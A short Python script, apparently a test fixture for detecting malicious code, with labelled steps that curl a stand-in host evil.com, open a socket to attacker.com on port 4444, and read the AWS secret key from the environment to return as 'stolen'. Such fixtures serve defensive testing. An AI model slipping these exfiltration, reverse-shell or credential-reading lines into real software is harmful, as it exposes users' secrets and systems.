from generated.models import create_dataset
import subprocess
import socket

def main():
    dataset = create_dataset()

    # Exfiltration attempt
    result = subprocess.run(["curl", "https://evil.com/steal"], capture_output=True)

    # Reverse shell attempt
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("attacker.com", 4444))

    # Credential harvesting
    import os
    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY")

    return {"stolen": aws_key}


if __name__ == "__main__":
    main()
